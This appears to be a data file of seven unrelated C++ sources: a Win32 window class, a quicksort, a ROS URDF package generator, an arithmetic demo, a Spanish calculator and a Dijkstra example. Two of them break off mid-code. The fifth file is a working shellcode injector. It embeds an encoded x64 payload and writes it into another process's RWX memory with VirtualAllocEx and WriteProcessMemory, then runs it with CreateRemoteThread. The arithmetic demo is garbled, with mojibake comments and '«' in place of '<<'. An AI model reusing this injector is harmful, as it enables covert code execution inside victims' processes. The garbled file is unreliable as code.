    "#include \"atlas/window/win32/window.hpp\"\n\n#include \"atlas/debug/assert.hpp\"\n#include \"atlas/system/win32/error.hpp\"\n#include \"atlas/system/win32/string.hpp\"\n\nnamespace Atlas::Win32 {\nbool Window::initialized = false;\n\nWindow::Window(Window *parent)\n{\n    if (!initialized) {\n        init();\n    }\n    const HWND parent_window = parent != nullptr ? parent->m_handle : nullptr;\n    m_handle = CreateWindowEx(0, L\"Atlas Window\", L\"Unnamed Window\",\n        WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,\n        CW_USEDEFAULT, parent_window, nullptr, GetModuleHandle(nullptr), this);\n    Debug::assert(m_handle != nullptr, get_last_error_message());\n}\n\nWindow::~Window()\n{\n    DestroyWindow(m_handle);\n}\n\nvoid Window::poll_events() const\n{\n    MSG msg{};\n    while (PeekMessage(&msg, m_handle, 0, 0, PM_REMOVE)) {\n        TranslateMessage(&msg);\n        DispatchMessage(&msg);\n    }\n}\n\nvoid Window::show() const\n{\n    ShowWindow(m_handle, SW_SHOWDEFAULT);\n}\n\nvoid Window::set_title(const std::string_view title) const\n{\n    const std::wstring wide_title = utf8_to_wstring(std::string(title));\n    SetWindowText(m_handle, wide_title.c_str());\n}\n\nvoid Window::set_position(Math::Nat2 position) const\n{\n    SetWindowPos(m_handle, nullptr, static_cast<Int>(position.x),\n        static_cast<Int>(position.y), 0, 0, SWP_NOSIZE | SWP_NOREPOSITION);\n}\n\nvoid Window::set_size(Math::Nat2 size) const\n{\n    SetWindowPos(m_handle, nullptr, 0, 0, static_cast<Int>(size.x),\n        static_cast<Int>(size.y), SWP_NOMOVE | SWP_NOREPOSITION);\n}\n\nLRESULT Window::handle_message(UINT msg, WPARAM w_param, LPARAM l_param)\n{\n    return DefWindowProc(m_handle, msg, w_param, l_param);\n}\n\nvoid Window::init()\n{\n    WNDCLASSEX window_class{\n        .cbSize = sizeof(WNDCLASSEX),\n        .lpfnWndProc = proc,\n        .hInstance = GetModuleHandle(nullptr),\n        .lpszClassName = L\"Atlas Window\",\n    };\n    ATOM class_atom = RegisterClassEx(&window_class);\n    Debug::assert(class_atom != 0, get_last_error_message());\n    initialized = true;\n}\n\nLRESULT Window::proc(HWND wnd, UINT msg, WPARAM w_param, LPARAM l_param)\n{\n    Window *window = nullptr;\n    if (msg == WM_NCCREATE) {\n        CREATESTRUCT *create = reinterpret_cast<CREATESTRUCT *>(l_param);\n        window = reinterpret_cast<Window *>(create->lpCreateParams);\n        SetWindowLongPtr(\n            wnd, GWLP_USERDATA, reinterpret_cast<LONG_PTR>(window));\n        window->m_handle = wnd;\n    }\n    else {\n        window\n            = reinterpret_cast<Window *>(GetWindowLongPtr(wnd, GWLP_USERDATA));\n    }\n\n    if (window != nullptr) {\n        return window->handle_message(msg, w_param, l_param);\n    }\n    else {\n        return DefWindowProc(wnd, msg, w_param, l_param);\n    }\n}\n}  // namespace Atlas::Win32\n",
    "#include <iostream>\n#include <fstream>\n#include <ctime>\nusing namespace std;\nint count_inter = 0;\n\nvoid swap(int values[], int i, int j){\n    /*\n    Troca dois valores de posi\u00e7ao em um array\n    param: int values[] - vetor de elementos\n    param: int i - primeiro elemento\n    param: int j - segundo elemento\n    */\n    int aux = values[j];\n    values[j] = values[i];\n    values[i] = aux;\n}\n\nint pickPivoIndexByMedian(int values[], int left, int right){\n    /*\n    Seleciona a mediana de 3 valores de uma lista\n    param: int values[] - vetor de elementos\n    param: int left - indice do elemento mais a direita\n    param: int right - indice do elemento mais a esquerda\n    return: indice\n    */\n    int mid = (left+right)/2;\n    if((values[left] > values[mid]) != (values[left] > values[right])){\n        return left;\n    }\n    else if((values[mid] > values[left]) != (values[mid] > values[right])){\n        return mid;\n    }\n    else {\n        return right;\n    }\n}\n\nint pickPivoIndexByRandom(int values[], int left, int right){\n    /*\n    Seleciona um indice randomico da lista\n    param: int values[] - vetor de elementos\n    param: int left - indice do elemento mais a direita\n    param: int right - indice do elemento mais a esquerda\n    return: indice\n    */\n    return (rand()%(right-left))+left;\n}\n\nint pickPivoIndexByLeft(int values[], int left, int right){\n    /*\n    Seleciona o primeiro indice\n    param: int values[] - vetor de elementos\n    param: int left - indice do elemento mais a direita\n    param: int right - indice do elemento mais a esquerda\n    return: indice\n    */\n    return left;\n}\n\n\nint partition(int values[], int left, int right){\n    /*\n    Seleciona um pivo\n    Ordena os elementos menores que o pivo a esquerda e os maiores a direita\n    param: int values[] - vetor de elementos\n    param: int left - indice do elemento mais a direita\n    param: int right - indice do elemento mais a esquerda\n    return: indice pivo\n    */\n\n    // int index_pivo = pickPivoIndexByLeft(values, left, right);\n    // int index_pivo = pickPivoIndexByRandom(values, left, right);\n    int index_pivo = pickPivoIndexByMedian(values, left, right);\n    \n    int pivo = values[index_pivo];\n    swap(values, left, index_pivo);\n    index_pivo = left;\n\n    for (int i = left+1; i<=right; i++){\n        if (values[i] <= pivo){\n            ++index_pivo;\n            swap(values, i, index_pivo);       \n        }\n    }\n    swap(values, left, index_pivo);\n    return index_pivo;\n}\n\nvoid quick_sort(int values[], int left, int right){\n    /*\n    Ordena um vetor com elementos inteiros\n    param: int values[] - vetor de elementos para ordena\u00e7\u00e3o\n    param: int left - indice do elemento mais a direita\n    param: int right - indice do elemento mais a esquerda\n    */\n    ++count_inter;\n    if (left < right){\n        int index_pivo = partition(values, left, right);\n        quick_sort(values, left, index_pivo-1);\n        quick_sort(values, index_pivo+1, right);\n    }\n}\n \n\nint main(){\n    int values[500];\n    srand(time(0));\n    \n    ifstream dados;\n\n    dados.open(\"./dados.txt\");\n    for (int i = 0; !dados.eof(); i++){\n        dados >> values[i];\n    }\n    dados.close();\n\n    int tm_v = sizeof(values)/sizeof(values[0])-1;\n    \n    quick_sort(values, 0, tm_v);\n\n    for(int i = 0; i<=tm_v; i++){\n        cout << values[i] << \", \";\n    }\n    cout << '\\n';\n    cout << \"Intera\u00e7\u00f5es: \" << count_inter << '\\n';\n}\n",
    "#include <robot_description_generator/robot_description_generator.hpp>\nRobotDescriptionGenerator::RobotDescriptionGenerator(std::string package_path, std::string urdf_path)\n  : package_path_(package_path), urdf_path_(urdf_path)\n{\n  tf_tree_ = urdf::parseURDFFile(urdf_path_);\n}\n\nvoid RobotDescriptionGenerator::generatePackage()\n{\n  makeDirPackage();\n  createCmakeLists();\n  createPackageXML();\n  createLaunch();\n  copyMeshes();\n  generateYAMLlimit();\n  generateURDFInc();\n  generateURDFmacro();\n  generateURDFcommon();\n}\n\nvoid RobotDescriptionGenerator::generateYAMLlimit()\n{\n  auto emitter_limit = createJointLimits();\n  auto emitter_mass = createLinkMass();\n\n  std::ofstream joint_limits(package_path_ + \"config/joint_limits.yaml\");\n  joint_limits << emitter_limit->c_str();\n  joint_limits.close();\n\n  std::ofstream link_mass(package_path_ + \"config/link_mass.yaml\");\n  link_mass << emitter_mass->c_str();\n  link_mass.close();\n}\n\nstd::shared_ptr<YAML::Emitter> RobotDescriptionGenerator::createJointLimits()\n{\n  auto emitter_limit = std::make_shared<YAML::Emitter>();\n\n  *emitter_limit << YAML::BeginMap;\n  *emitter_limit << YAML::Key << \"joint_limits\" << YAML::Value << YAML::BeginMap;\n\n  for (const auto& [joint_name, joint_value] : tf_tree_->joints_)\n  {\n    if (joint_value->limits != nullptr)\n    {\n      *emitter_limit << YAML::Key << joint_name << YAML::Value << YAML::BeginMap;\n\n      *emitter_limit << YAML::Key << \"min_position\" << YAML::Value << joint_value->limits->lower;\n      *emitter_limit << YAML::Key << \"max_position\" << YAML::Value << joint_value->limits->upper;\n      *emitter_limit << YAML::Key << \"max_effort\" << YAML::Value << joint_value->limits->effort;\n      *emitter_limit << YAML::Key << \"max_velocity\" << YAML::Value << joint_value->limits->velocity;\n      *emitter_limit << YAML::EndMap;\n    }\n  }\n  *emitter_limit << YAML::EndMap;\n  *emitter_limit << YAML::EndMap;\n\n  return emitter_limit;\n}\n\nstd::shared_ptr<YAML::Emitter> RobotDescriptionGenerator::createLinkMass()\n{\n  auto emitter_mass = std::make_shared<YAML::Emitter>();\n\n  *emitter_mass << YAML::BeginMap;\n  *emitter_mass << YAML::Key << \"link_mass\" << YAML::Value << YAML::BeginMap;\n  for (const auto& [link_name, link_value] : tf_tree_->links_)\n  {\n    *emitter_mass << YAML::Key << link_name << YAML::Value << YAML::BeginMap;\n    *emitter_mass << YAML::Key << \"mass\" << YAML::Value << link_value->inertial->mass;\n    *emitter_mass << YAML::EndMap;\n  }\n  *emitter_mass << YAML::EndMap;\n  *emitter_mass << YAML::EndMap;\n\n  return emitter_mass;\n}\n\nvoid RobotDescriptionGenerator::generateURDFInc()\n{\n  std::ofstream xacro_macro_inc(package_path_ + \"urdf/inc/\" + tf_tree_->name_ + \"_property.xacro\");\n\n  xacro_macro_inc << \"<?xml version=\\\"1.0\\\"?>\\n\";\n  xacro_macro_inc << \"<robot xmlns:xacro=\\\"http://ros.org/wiki/xacro\\\">\\n\";\n\n  setProperty(xacro_macro_inc);\n\n  xacro_macro_inc << \"</robot>\\n\";\n\n  xacro_macro_inc.close();\n}\n\nvoid RobotDescriptionGenerator::setProperty(std::ofstream& file)\n{\n  file << \"   <xacro:property name=\\\"yaml_path_joint_limits\\\" value=\\\"$(find \" + new_package_name +\n              \")/config/joint_limits.yaml\\\" />\\n\";\n  file << \"   <xacro:property name=\\\"yaml_path_link_mass\\\" value=\\\"$(find \" + new_package_name +\n              \")/config/link_mass.yaml\\\" />\\n\";\n\n  file << \"   <xacro:property name=\\\"yaml_file_joint_limits\\\" \"\n          \"value=\\\"${xacro.load_yaml(yaml_path_joint_limits)}\\\"/>\\n\\n\";\n  file << \"   <xacro:property name=\\\"yaml_file_link_mass\\\" \"\n          \"value=\\\"${xacro.load_yaml(yaml_path_link_mass)}\\\"/>\\n\";\n\n  file << \"   <!-- link mass [kg] -->\\n\";\n  for (const auto& [link_name, link_value] : tf_tree_->links_)\n  {\n    file << \"   <xacro:property name=\\\"\" << link_name << \"_mass\"\n         << \"\\\" \"\n            \"value=\\\"${yaml_file_link_mass['link_mass']['\"\n         << link_name << \"']['mass']}\\\"/>\\n\";\n  }\n\n  file << \"\\n   <!-- joint limits [rad] -->\\n\";\n  for (const auto& [joint_name, joint_value] : tf_tree_->joints_)\n  {\n    file << \"   <xacro:property name=\\\"\" << joint_name << \"_lower_limit\"\n         << \"\\\" \"\n            \"value=\\\"${yaml_file_joint_limits['joint_limits']['\"\n         << joint_name << \"']['min_position']}\\\"/>\\n\";\n    file << \"   <xacro:property name=\\\"\" << joint_name << \"_upper_limit\"\n         << \"\\\" \"\n            \"value=\\\"${yaml_file_joint_limits['joint_limits']['\"\n         << joint_name << \"']['max_position']}\\\"/>\\n\";\n  }\n\n  file << \"\\n   <!-- joint velocity limits [rad/s] -->\\n\";\n  for (const auto& [joint_name, joint_value] : tf_tree_->joints_)\n  {\n    file << \"   <xacro:property name=\\\"\" << joint_name << \"_velocity_limit\"\n         << \"\\\" \"\n            \"value=\\\"${yaml_file_joint_limits['joint_limits']['\"\n         << joint_name << \"']['max_velocity']}\\\"/>\\n\";\n  }\n\n  file << \"\\n   <!-- joint effort limits -->\\n\";\n  for (const auto& [joint_name, joint_value] : tf_tree_->joints_)\n  {\n    file << \"   <xacro:property name=\\\"\" << joint_name << \"_effort_limit\"\n         << \"\\\" \"\n            \"value=\\\"${yaml_file_joint_limits[",
    "#include <iostream>\r\n\r\nusing namespace std;\r\n\r\nint main() {\r\n\t// \u00c7\u00e0\u00e4\u00e0\u00ed\u00e8\u00e5 1: \u00c0\u00f0\u00e8\u00f4\u00ec\u00e5\u00f2\u00e8\u00f7\u00e5\u00f1\u00ea\u00e8\u00e5 \u00e4\u00e5\u00e9\u00f1\u00f2\u00e2\u00e8\u00ff\r\n\tint a = 10, b = 5;\r\n\r\n\tcout \u00ab \"a + b = \" \u00ab a + b \u00ab endl;\r\n\tcout \u00ab \"a - b = \" \u00ab a - b \u00ab endl;\r\n\tcout \u00ab \"a * b = \" \u00ab a * b \u00ab endl;\r\n\tcout \u00ab \"a / b = \" \u00ab a / b \u00ab endl;\r\n\tcout \u00ab \"a % b = \" \u00ab a % b \u00ab endl; // \u00ce\u00f1\u00f2\u00e0\u00f2\u00ee\u00ea \u00ee\u00f2 \u00e4\u00e5\u00eb\u00e5\u00ed\u00e8\u00ff\r\n\tcout \u00ab \"a++ = \" \u00ab a++ \u00ab endl; // \u00cf\u00ee\u00f1\u00f2\u00f4\u00e8\u00ea\u00f1\u00ed\u00fb\u00e9 \u00e8\u00ed\u00ea\u00f0\u00e5\u00ec\u00e5\u00ed\u00f2\r\n\tcout \u00ab \"a = \" \u00ab a \u00ab endl; // \u00c7\u00ed\u00e0\u00f7\u00e5\u00ed\u00e8\u00e5 a \u00ef\u00ee\u00f1\u00eb\u00e5 \u00e8\u00ed\u00ea\u00f0\u00e5\u00ec\u00e5\u00ed\u00f2\u00e0\r\n\tcout \u00ab \"b\u2014 = \" \u00ab b\u2014 \u00ab endl; // \u00cf\u00ee\u00f1\u00f2\u00f4\u00e8\u00ea\u00f1\u00ed\u00fb\u00e9 \u00e4\u00e5\u00ea\u00f0\u00e5\u00ec\u00e5\u00ed\u00f2\r\n\tcout \u00ab \"b = \" \u00ab b \u00ab endl; // \u00c7\u00ed\u00e0\u00f7\u00e5\u00ed\u00e8\u00e5 b \u00ef\u00ee\u00f1\u00eb\u00e5 \u00e4\u00e5\u00ea\u00f0\u00e5\u00ec\u00e5\u00ed\u00f2\u00e0\r\n\r\n\t// \u00c7\u00e0\u00e4\u00e0\u00ed\u00e8\u00e5 2: \u00ce\u00ef\u00e5\u00f0\u00e0\u00f2\u00ee\u00f0\u00fb \u00f1\u00f0\u00e0\u00e2\u00ed\u00e5\u00ed\u00e8\u00ff\r\n\tcout \u00ab endl \u00ab \"\u00ce\u00ef\u00e5\u00f0\u00e0\u00f2\u00ee\u00f0\u00fb \u00f1\u00f0\u00e0\u00e2\u00ed\u00e5\u00ed\u00e8\u00ff:\" \u00ab endl;\r\n\tcout \u00ab \"a == b: \" \u00ab(a == b) \u00ab endl;\r\n\tcout \u00ab \"a != b: \" \u00ab(a != b) \u00ab endl;\r\n\tcout \u00ab \"a > b: \" \u00ab(a > b) \u00ab endl;\r\n\tcout \u00ab \"a < b: \" \u00ab(a < b) \u00ab endl;\r\n\tcout \u00ab \"a >= b: \" \u00ab(a >= b) \u00ab endl;\r\n\tcout \u00ab \"a <= b: \" \u00ab(a <= b) \u00ab endl;\r\n\r\n\t// \u00c7\u00e0\u00e4\u00e0\u00ed\u00e8\u00e5 3: \u00cb\u00ee\u00e3\u00e8\u00f7\u00e5\u00f1\u00ea\u00e8\u00e5 \u00ee\u00ef\u00e5\u00f0\u00e0\u00f2\u00ee\u00f0\u00fb\r\n\tcout \u00ab endl \u00ab \"\u00cb\u00ee\u00e3\u00e8\u00f7\u00e5\u00f1\u00ea\u00e8\u00e5 \u00ee\u00ef\u00e5\u00f0\u00e0\u00f2\u00ee\u00f0\u00fb:\" \u00ab endl;\r\n\tbool c = true, d = false;\r\n\r\n\tcout \u00ab \"!c: \" \u00ab !c \u00ab endl; // \u00cb\u00ee\u00e3\u00e8\u00f7\u00e5\u00f1\u00ea\u00ee\u00e5 \u00ee\u00f2\u00f0\u00e8\u00f6\u00e0\u00ed\u00e8\u00e5\r\n\tcout \u00ab \"c && d: \" \u00ab(c && d) \u00ab endl; // \u00cb\u00ee\u00e3\u00e8\u00f7\u00e5\u00f1\u00ea\u00ee\u00e5 \u00c8\r\n\tcout \u00ab \"c || d: \" \u00ab(c || d) \u00ab endl; // \u00cb\u00ee\u00e3\u00e8\u00f7\u00e5\u00f1\u00ea\u00ee\u00e5 \u00c8\u00cb\u00c8\r\n\r\n\treturn 0;\r\n}",
    "\ufeff#include \"Windows.h\"\r\n#include <iostream>\r\n\r\n\r\nint main(int argc, char* argv[])\r\n\r\n{\r\n\r\n    unsigned char shellcode[] =\r\n\r\n        \"\\x48\\x31\\xc9\\x48\\x81\\xe9\\xc6\\xff\\xff\\xff\\x48\\x8d\\x05\\xef\"\r\n        \"\\xff\\xff\\xff\\x48\\xbb\\x96\\x99\\xd0\\xa2\\xe6\\x82\\xba\\x04\\x48\"\r\n        \"\\x31\\x58\\x27\\x48\\x2d\\xf8\\xff\\xff\\xff\\xe2\\xf4\\x6a\\xd1\\x53\"\r\n        \"\\x46\\x16\\x6a\\x7a\\x04\\x96\\x99\\x91\\xf3\\xa7\\xd2\\xe8\\x55\\xc0\"\r\n        \"\\xd1\\xe1\\x70\\x83\\xca\\x31\\x56\\xf6\\xd1\\x5b\\xf0\\xfe\\xca\\x31\"\r\n        \"\\x56\\xb6\\xd1\\x5b\\xd0\\xb6\\xca\\xb5\\xb3\\xdc\\xd3\\x9d\\x93\\x2f\"\r\n        \"\\xca\\x8b\\xc4\\x3a\\xa5\\xb1\\xde\\xe4\\xae\\x9a\\x45\\x57\\x50\\xdd\"\r\n        \"\\xe3\\xe7\\x43\\x58\\xe9\\xc4\\xd8\\x81\\xea\\x6d\\xd0\\x9a\\x8f\\xd4\"\r\n        \"\\xa5\\x98\\xa3\\x36\\x09\\x3a\\x8c\\x96\\x99\\xd0\\xea\\x63\\x42\\xce\"\r\n        \"\\x63\\xde\\x98\\x00\\xf2\\x6d\\xca\\xa2\\x40\\x1d\\xd9\\xf0\\xeb\\xe7\"\r\n        \"\\x52\\x59\\x52\\xde\\x66\\x19\\xe3\\x6d\\xb6\\x32\\x4c\\x97\\x4f\\x9d\"\r\n        \"\\x93\\x2f\\xca\\x8b\\xc4\\x3a\\xd8\\x11\\x6b\\xeb\\xc3\\xbb\\xc5\\xae\"\r\n        \"\\x79\\xa5\\x53\\xaa\\x81\\xf6\\x20\\x9e\\xdc\\xe9\\x73\\x93\\x5a\\xe2\"\r\n        \"\\x40\\x1d\\xd9\\xf4\\xeb\\xe7\\x52\\xdc\\x45\\x1d\\x95\\x98\\xe6\\x6d\"\r\n        \"\\xc2\\xa6\\x4d\\x97\\x49\\x91\\x29\\xe2\\x0a\\xf2\\x05\\x46\\xd8\\x88\"\r\n        \"\\xe3\\xbe\\xdc\\xe3\\x5e\\xd7\\xc1\\x91\\xfb\\xa7\\xd8\\xf2\\x87\\x7a\"\r\n        \"\\xb9\\x91\\xf0\\x19\\x62\\xe2\\x45\\xcf\\xc3\\x98\\x29\\xf4\\x6b\\xed\"\r\n        \"\\xfb\\x69\\x66\\x8d\\xeb\\x58\\xf5\\xc9\\x36\\xc9\\xaa\\xe2\\xa2\\xe6\"\r\n        \"\\xc3\\xec\\x4d\\x1f\\x7f\\x98\\x23\\x0a\\x22\\xbb\\x04\\x96\\xd0\\x59\"\r\n        \"\\x47\\xaf\\x3e\\xb8\\x04\\x93\\xa0\\x10\\x0a\\xe6\\xe8\\xfb\\x50\\xdf\"\r\n        \"\\x10\\x34\\xee\\x6f\\x73\\xfb\\xbe\\xda\\xee\\xf6\\xa5\\x19\\x57\\xf6\"\r\n        \"\\x8d\\x7c\\xf1\\xd1\\xa3\\xe6\\x82\\xe3\\x45\\x2c\\xb0\\x50\\xc9\\xe6\"\r\n        \"\\x7d\\x6f\\x54\\xc6\\xd4\\xe1\\x6b\\xab\\xb3\\x7a\\x4c\\x69\\x59\\x98\"\r\n        \"\\x2b\\x24\\xca\\x45\\xc4\\xde\\x10\\x11\\xe3\\x5c\\x68\\xb5\\xdb\\x76\"\r\n        \"\\x66\\x05\\xea\\x6f\\x45\\xd0\\x14\\xd7\\xc1\\x9c\\x2b\\x04\\xca\\x33\"\r\n        \"\\xfd\\xd7\\x23\\x49\\x07\\x92\\xe3\\x45\\xd1\\xde\\x18\\x14\\xe2\\xe4\"\r\n        \"\\x82\\xba\\x4d\\x2e\\xfa\\xbd\\xc6\\xe6\\x82\\xba\\x04\\x96\\xd8\\x80\"\r\n        \"\\xe3\\xb6\\xca\\x33\\xe6\\xc1\\xce\\x87\\xef\\xd7\\x42\\xd0\\x09\\xcf\"\r\n        \"\\xd8\\x80\\x40\\x1a\\xe4\\x7d\\x40\\xb2\\xcd\\xd1\\xa3\\xae\\x0f\\xfe\"\r\n        \"\\x20\\x8e\\x5f\\xd0\\xca\\xae\\x0b\\x5c\\x52\\xc6\\xd8\\x80\\xe3\\xb6\"\r\n        \"\\xc3\\xea\\x4d\\x69\\x59\\x91\\xf2\\xaf\\x7d\\x72\\x49\\x1f\\x58\\x9c\"\r\n        \"\\x2b\\x27\\xc3\\x00\\x7d\\x5a\\xa6\\x56\\x5d\\x33\\xca\\x8b\\xd6\\xde\"\r\n        \"\\x66\\x1a\\x29\\xe8\\xc3\\x00\\x0c\\x11\\x84\\xb0\\x5d\\x33\\x39\\x4a\"\r\n        \"\\xb1\\x34\\xcf\\x91\\x18\\x40\\x17\\x07\\x99\\x69\\x4c\\x98\\x21\\x22\"\r\n        \"\\xaa\\x86\\x02\\xea\\x93\\x50\\x59\\x06\\xf7\\xbf\\xbf\\xd1\\x8a\\xa2\"\r\n        \"\\xcd\\x8c\\x82\\xe3\\x45\\x1f\\x43\\x2f\\x77\\xe6\\x82\\xba\\x04\";\r\n\r\n\r\n    HANDLE processHandle;\r\n\r\n    HANDLE remoteThread;\r\n\r\n    PVOID remoteBuffer;\r\n\r\n\r\n    // \u0418\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0435\u043c cout \u0432\u043c\u0435\u0441\u0442\u043e printf\r\n    std::cout << \"Injecting to PID: \" << atoi(argv[1]) << std::endl;\r\n\r\n    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));\r\n    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);\r\n    WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);\r\n    remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);\r\n    CloseHandle(processHandle);\r\n\r\n    return 0;\r\n\r\n\r\n\r\n    return 0;\r\n\r\n}",
    "#include <cstdlib>\n#include <iostream.h>\n#include <stdio.h>\n#include <conio.h>\n#include <string.h>\n#include<math.h>\n\nusing namespace std;\n\nint main(int argc, char *argv[])\n{\n    void Calcula_SENO();\n    void Calcula_COSENO();\n    void Calcula_TANGENTE();\n    float angulo,opuesto,hipotenusa,adyacente;\n    float a,b,c,d;\n    char op;\n    int e,f;\n    int opciones;\n    int x1,x2,A; \n    double l;\n    opciones=0;\n    cout<<\"------------------Bienvenidos---------------------\"<<endl<<endl;\n    cout<<\"----------------Calculadora Luis------------------\"<<endl<<endl;\n    cout<<\"--------------------------------------------------\"<<endl<<endl;\n    cout<<\"--------------------------------------------------\"<<endl<<endl;\n    cout<<\"--------Menu de Operaciones--------\"<<endl<<endl;\n    cout<<\"1. Raiz Cuadrada\"<<endl<<endl;\n    cout<<\"2. Raiz Cubica\"<<endl<<endl;\n    cout<<\"3. Seno\"<<endl<<endl;\n    cout<<\"4. Coseno\"<<endl<<endl;\n    cout<<\"5. Tangente\"<<endl<<endl;\n    cout<<\"6. Logaritmo\"<<endl<<endl;\n    cout<<\"7. Valor absoluto\"<<endl<<endl;\n    cout<<\"Seleccione Una Opcion:\";\n    cin>>opciones;\n    cout<<\"-------------------------------\"<<endl<<endl;\n    cout<<\"-------------------------------\"<<endl<<endl;\n    switch (opciones){\n           case 1:cout<<\"Ingrese un Numero segun la operacion:\";\n                  cin>>a;\n                  cout<<\"Su resultado es:\"<<sqrt(a)<<endl<<endl;\n                  break;\n           case 2:cout<<\"Ingrese un Numero segun la operacion:\";\n                  cin>>a;\n                  cout<<\"Su resultado es:\"<<pow(a,1.0/3.0)<<endl<<endl;\n                  break;\n           case 3:cout<<\"Ingrese por favor el angulo:\\t\\t\";\n                  cin>>angulo;\n                  cout<<\"Ingrese por favor el opuesto:\\t\\t\";\n                  cin>>opuesto;\n                  cout<<\"Ingrese por favor la hipotenusa:\\t\";\n                  cin>>hipotenusa;\n                  fflush(stdin);\n                  cout<<\"\\nEl seno de:\\t\"<<angulo<<\"\\tes:\\t\\t\"<<opuesto/hipotenusa<<\"\\n\\n\";\n                  break;\n           case 4:cout<<\"Ingrese por favor el angulo:\\t\\t\";\n                  cin>>angulo;\n                  cout<<\"Ingrese por favor la adyacente:\\t\";\n                  cin>>adyacente;\n                  cout<<\"Ingrese por favor la hipotenusa:\\t\";\n                  cin>>hipotenusa;\n                  fflush(stdin);\n                  cout<<\"\\nEl coseno de:\\t\"<<angulo<<\"\\tes:\\t\\t\"<<adyacente/hipotenusa<<\"\\n\\n\";\n                  break;\n           case 5:cout<<\"Ingrese por favor el angulo: \\t\\t\";\n                  cin>> angulo;\n                  cout<<\"Ingrese por favor la adyacente: \\t\";\n                  cin>> adyacente;\n                  cout<<\"Ingrese por favor el opuesto: \\t\\t\";\n                  cin>>opuesto;\n                  fflush(stdin);\n                  cout<<\"\\nLa Tangente de:\\t\"<<angulo<<\"\\tes:\\t\\t\"<<opuesto/adyacente<<\"\\n\\n\";\n                  break;\n           case 6:cout<<\"\\nEscribe un digito:\";\n                  cin>> l;\n                  cout<< \"El logaritmo natural del argumento es \" << log(l) << endl;\n                  break;\n           case 7:cout<<\"Ingrese x2: \"; \n                  cin>>x2; \n                  cout<<\"Ingrese x1: \"; \n                  cin>>x1; \n                  A=abs(x2-x1); \n                  cout<<\"A:\"<<A<<endl; \n                  break;                    \n}\n    getch(); \n                        \n    system(\"PAUSE\");\n    return EXIT_SUCCESS;\n}\n",
    "/* https://www.programiz.com/dsa/dijkstra-algorithm\n Dijkstra's Algorithm in C++\n*/\n\n#include <iostream>\n#include <vector>\n\n#define INT_MAX 10000000\n\nusing namespace std;\n\nvoid DijkstrasTest();\n\nint main() {\n  DijkstrasTest();\n  return 0;\n}\n\nclass Node;\nclass Edge;\n\nvoid Dijkstras();\nvector<Node*>* AdjacentRemainingNodes(Node* node);\nNode* ExtractSmallest(vector<Node*>& nodes);\nint Distance(Node* node1, Node* node2);\nbool Contains(vector<Node*>& nodes, Node* node);\nvoid PrintShortestRouteTo(Node* destination);\n\nvector<Node*> nodes;\nvector<Edge*> edges;\n\nclass Node {\n   public:\n  Node(char id)\n    : id(id), previous(NULL), distanceFromStart(INT_MAX) {\n    nodes.push_back(this);\n  }\n\n   public:\n  char id;\n  Node* previous;\n  int distanceFromStart;\n};\n\nclass Edge {\n   public:\n  Edge(Node* node1, Node* node2, int distance)\n    : node1(node1), node2(node2), distance(distance) {\n    edges.push_back(this);\n  }\n  bool Connects(Node* node1, Node* node2) {\n    return (\n      (node1 == this->node1 &&\n       node2 == this->node2) ||\n      (node1 == this->node2 &&\n       node2 == this->node1));\n  }\n\n   public:\n  Node* node1;\n  Node* node2;\n  int distance;\n};\n\n///////////////////\nvoid DijkstrasTest() {\n  Node* a = new Node('a');\n  Node* b = new Node('b');\n  Node* c = new Node('c');\n  Node* d = new Node('d');\n  Node* e = new Node('e');\n  Node* f = new Node('f');\n  Node* g = new Node('g');\n\n  Edge* e1 = new Edge(a, c, 1);\n  Edge* e2 = new Edge(a, d, 2);\n  Edge* e3 = new Edge(b, c, 2);\n  Edge* e4 = new Edge(c, d, 1);\n  Edge* e5 = new Edge(b, f, 3);\n  Edge* e6 = new Edge(c, e, 3);\n  Edge* e7 = new Edge(e, f, 2);\n  Edge* e8 = new Edge(d, g, 1);\n  Edge* e9 = new Edge(g, f, 1);\n\n  a->distanceFromStart = 0;  // set start node\n  Dijkstras();\n  PrintShortestRouteTo(f);\n}\n\n///////////////////\n\nvoid Dijkstras() {\n  while (nodes.size() > 0) {\n    Node* smallest = ExtractSmallest(nodes);\n    vector<Node*>* adjacentNodes =\n      AdjacentRemainingNodes(smallest);\n\n    const int size = adjacentNodes->size();\n    for (int i = 0; i < size; ++i) {\n      Node* adjacent = adjacentNodes->at(i);\n      int distance = Distance(smallest, adjacent) +\n               smallest->distanceFromStart;\n\n      if (distance < adjacent->distanceFromStart) {\n        adjacent->distanceFromStart = distance;\n        adjacent->previous = smallest;\n      }\n    }\n    delete adjacentNodes;\n  }\n}\n\n// Find the node with the smallest distance,\n// remove it, and return it.\nNode* ExtractSmallest(vector<Node*>& nodes) {\n  int size = nodes.size();\n  if (size == 0) return NULL;\n  int smallestPosition = 0;\n  Node* smallest = nodes.at(0);\n  for (int i = 1; i < size; ++i) {\n    Node* current = nodes.at(i);\n    if (current->distanceFromStart <\n      smallest->distanceFromStart) {\n      smallest = current;\n      smallestPosition = i;\n    }\n  }\n  nodes.erase(nodes.begin() + smallestPosition);\n  return smallest;\n}\n\n// Return all nodes adjacent to 'node' which are still\n// in the 'nodes' collection.\nvector<Node*>* AdjacentRemainingNodes(Node* node) {\n  vector<Node*>* adjacentNodes = new vector<Node*>();\n  const int size = edges.size();\n  for (int i = 0; i < size; ++i) {\n    Edge* edge = edges.at(i);\n    Node* adjacent = NULL;\n    if (edge->node1 == node) {\n      adjacent = edge->node2;\n    } else if (edge->node2 == node) {\n      adjacent = edge->node1;\n    }\n    if (adjacent && Contains(nodes, adjacent)) {\n      adjacentNodes->push_back(adjacent);\n    }\n  }\n  return adjacentNodes;\n}\n\n// Return distance between two connected nodes\nint Distance(Node* node1, Node* node2) {\n  const int size = edges.size();\n  for (int i = 0; i < size; ++i) {\n    Edge* edge = edges.at(i);\n    if (edge->Connects(node1, node2)) {\n      return edge->distance;\n    }\n  }\n  return -1;  // should never happen\n}\n\n// Does the 'nodes' vector contain 'node'\nbool Contains(vector<Node*>& nodes, Node* node) {\n  const int size = nodes.size();\n  for (int i = 0; i < size; ++i) {\n    if (node == nodes.at(i)) {\n      return true;\n    }\n  